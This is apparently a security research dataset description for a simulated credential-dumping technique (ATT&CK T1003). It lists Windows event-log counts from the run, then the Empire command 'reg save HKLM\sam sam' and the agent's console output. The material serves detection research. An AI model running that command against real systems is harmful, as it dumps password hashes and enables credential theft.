
# Empire Reg Dump SAM

An adversary with administrator privileges can use the windows reg utility to dump the SAM registry hive.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_reg_dump_sam.tar.gz](./empire_reg_sam.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19022540

## About this file

| log_name                                 | source_name                         | task                                                   |   record_number |
|------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details                             |             186 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             339 |
| Security                                 | Microsoft-Windows-Security-Auditing | User Account Management                                |              74 |
| Security                                 | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              49 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Creation                                       |               8 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
| Security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               7 |
| Security                                 | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               6 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership                                       |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                                                  |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                                          |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Termination                                    |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             354 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             278 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             114 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              69 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              24 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              22 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               4 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             153 |
| Microsoft-Windows-DNS-Client/Operational | Microsoft-Windows-DNS-Client        | na                                                     |             377 |

## Empire Activity

```
shell reg save HKLM\sam sam
```

```
[*] Tasked FD6A3MGY to run TASK_SHELL
[*] Agent FD6A3MGY tasked with task ID 8
(Empire: FD6A3MGY) > ..Command execution completed.

(Empire: FD6A3MGY) >
```